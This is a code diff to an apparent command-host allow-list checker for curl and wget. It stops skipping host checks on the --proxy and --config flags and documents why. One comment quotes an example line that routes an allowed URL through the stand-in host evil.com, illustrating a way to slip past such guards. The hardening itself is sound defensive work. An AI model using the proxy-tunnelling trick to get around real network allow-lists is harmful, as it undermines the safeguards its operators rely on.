@@ -70,16 +70,12 @@ _VALUE_TAKING_FLAGS = {
     "-u",
     "--user",
     "--password",
-    "-x",
-    "--proxy",
     "-T",
     "--upload-file",
     "-E",
     "--cert",
     "--key",
     "--cacert",
-    "-K",
-    "--config",
     "-w",
     "--write-out",
     "-m",
@@ -92,12 +88,22 @@ _VALUE_TAKING_FLAGS = {
     "-P",
     "--directory-prefix",
 }
-# Deliberately NOT skipped: `--resolve HOST:PORT:ADDR` and
-# `--connect-to H1:P1:H2:P2` carry meaningful hostnames in their values that
-# redirect where the connection actually goes, so those values must keep
-# being host-checked. Per this module's own principle (skip only flags whose
-# value is never a host), leaving them out at worst over-blocks a legitimate
-# --resolve target — the safe direction. (Devin review on #847.)
+# Deliberately NOT skipped — flags whose value IS (or can carry) the real
+# network destination, so the value must keep being host-checked:
+#   -x / --proxy        the proxy value is the actual TCP peer for the request
+#                       (`curl -x evil.com https://api.github.com/…` connects to
+#                       evil.com); skipping it would tunnel an allow-listed
+#                       visible URL through an arbitrary proxy.
+#   -K / --config       a curl config file can contain url=/proxy=/header=
+#                       directives defining the real request; its filename is
+#                       not a host, so host-matching over-blocks (safe) rather
+#                       than blessing an opaque config.
+#   --resolve HOST:PORT:ADDR / --connect-to H1:P1:H2:P2 pin or redirect the
+#                       connection to an arbitrary host/IP; the leading host
+#                       component stays checked.
+# Per this module's own principle (skip only flags whose value is never a host),
+# leaving these out at worst over-blocks — the safe direction.
+# (Devin + security review on #847.)
 
 
 def _hosts_in_command(cmd: str) -> list[str]:
